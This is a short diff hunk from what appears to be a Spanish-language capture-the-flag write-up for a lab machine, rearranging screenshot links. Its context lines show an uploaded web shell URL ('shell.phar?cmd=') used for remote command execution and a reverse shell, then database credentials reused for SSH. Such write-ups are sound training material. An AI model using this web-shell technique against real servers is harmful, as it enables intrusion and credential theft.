@@ -82,14 +82,12 @@ http://admin.arka.thl/uploads/shell.phar?cmd=
 
  Esto nos dio ejecución remota mediante una reverse shell.
 
-![17](17.png)
-
 ![18](18.png)
+
+![19](19.png)
 
 Investigando encontramos una base de datos con las credenciales del usuario Scott y nos 
 conectamos mediante SSH.
-
-![19](19.png)
 
 ![20](20.png)
 
